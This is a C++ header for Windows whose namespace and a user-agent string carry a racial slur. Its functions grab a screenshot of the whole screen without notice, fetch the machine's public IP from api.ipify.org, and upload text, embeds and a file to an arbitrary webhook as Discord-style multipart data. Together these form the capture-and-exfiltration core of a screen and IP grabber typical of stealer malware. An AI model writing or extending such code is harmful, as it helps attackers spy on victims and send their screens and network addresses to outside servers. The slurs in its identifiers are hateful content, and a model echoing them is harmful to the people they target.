#pragma once
#include <windows.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <sstream>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdiplus.lib")

namespace niggerhook {

    struct Embed {
        std::string title;
        std::string description;
        std::string url;
        std::string color;
    };

    inline ULONG_PTR start_gdiplus() {
        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR token;
        Gdiplus::GdiplusStartup(&token, &gdiplusStartupInput, nullptr);
        return token;
    }

    inline void stop_gdiplus(ULONG_PTR token) {
        Gdiplus::GdiplusShutdown(token);
    }

    inline std::vector<BYTE> capture_screenshot() {
        HDC hScreen = GetDC(nullptr);
        HDC hDC = CreateCompatibleDC(hScreen);
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
        SelectObject(hDC, hBitmap);
        BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY | CAPTUREBLT);

        Gdiplus::Bitmap bitmap(hBitmap, nullptr);
        IStream* istream = nullptr;
        CreateStreamOnHGlobal(NULL, TRUE, &istream);
        CLSID clsid;
        CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &clsid); // PNG
        bitmap.Save(istream, &clsid, nullptr);

        STATSTG stat;
        istream->Stat(&stat, STATFLAG_NONAME);
        ULONG size = stat.cbSize.LowPart;
        std::vector<BYTE> buffer(size);
        LARGE_INTEGER liZero = {};
        istream->Seek(liZero, STREAM_SEEK_SET, NULL);
        ULONG read = 0;
        istream->Read(buffer.data(), size, &read);
        istream->Release();

        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(nullptr, hScreen);
        return buffer;
    }

    inline std::string get_public_ip() {
        std::string ip;
        HINTERNET hSession = WinHttpOpen(L"niggerip/1.0",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return "";

        HINTERNET hConnect = WinHttpConnect(hSession, L"api.ipify.org", 443, 0);
        if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/",
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);
        if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return ""; }

        if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
            WinHttpReceiveResponse(hRequest, NULL)) {

            DWORD bytesAvailable = 0;
            while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
                std::vector<char> buffer(bytesAvailable);
                DWORD bytesRead = 0;
                if (WinHttpReadData(hRequest, buffer.data(), bytesAvailable, &bytesRead)) {
                    ip.append(buffer.data(), bytesRead);
                }
            }
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return ip;
    }

    inline bool send_webhook(const std::string& webhook_url, const std::string& content = "", const Embed* embed = nullptr, const std::vector<BYTE>* fileData = nullptr, const std::string& filename = "screenshot.png") {
        std::string host, path;
        size_t pos = webhook_url.find("/", 8);
        if (pos == std::string::npos) return false;
        host = webhook_url.substr(8, pos - 8);
        path = webhook_url.substr(pos);

        HINTERNET hSession = WinHttpOpen(L"SafeWebhook/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return false;
        HINTERNET hConnect = WinHttpConnect(hSession, std::wstring(host.begin(), host.end()).c_str(), 443, 0);
        if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", std::wstring(path.begin(), path.end()).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

        std::string body;
        std::wstring headers;

        if (fileData) {
            std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
            std::ostringstream ss;
            ss << "--" << boundary << "\r\n";
            if (!content.empty() || embed) {
                ss << "Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n{";
                if (!content.empty()) ss << "\"content\":\"" << content << "\"";
                if (embed) {
                    if (!content.empty()) ss << ",";
                    ss << "\"embeds\":[{\"title\":\"" << embed->title << "\",\"description\":\"" << embed->description << "\"";
                    if (!embed->url.empty()) ss << ",\"url\":\"" << embed->url << "\"";
                    if (!embed->color.empty()) ss << ",\"color\":" << embed->color;
                    ss << "}]";
                }
                ss << "}\r\n";
            }
            ss << "--" << boundary << "\r\n";
            ss << "Content-Disposition: form-data; name=\"file\"; filename=\"" << filename << "\"\r\n";
            ss << "Content-Type: application/octet-stream\r\n\r\n";
            body = ss.str();

            // Append raw binary
            std::vector<BYTE> finalBody(body.begin(), body.end());
            finalBody.insert(finalBody.end(), fileData->begin(), fileData->end());
            std::string ending = "\r\n--" + boundary + "--\r\n";
            finalBody.insert(finalBody.end(), ending.begin(), ending.end());

            headers = L"Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\r\n";

            BOOL bResults = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(),
                finalBody.data(), (DWORD)finalBody.size(), (DWORD)finalBody.size(), 0);
            if (bResults) bResults = WinHttpReceiveResponse(hRequest, NULL);

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);

            return bResults == TRUE;
        }
        else {
            std::ostringstream ss;
            ss << "{";
            if (!content.empty()) ss << "\"content\":\"" << content << "\"";
            if (embed) {
                if (!content.empty()) ss << ",";
                ss << "\"embeds\":[{\"title\":\"" << embed->title << "\",\"description\":\"" << embed->description << "\"";
                if (!embed->url.empty()) ss << ",\"url\":\"" << embed->url << "\"";
                if (!embed->color.empty()) ss << ",\"color\":" << embed->color;
                ss << "}]";
            }
            ss << "}";
            body = ss.str();
            headers = L"Content-Type: application/json\r\n";

            BOOL bResults = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(),
                (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
            if (bResults) bResults = WinHttpReceiveResponse(hRequest, NULL);

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);

            return bResults == TRUE;
        }
    }

}
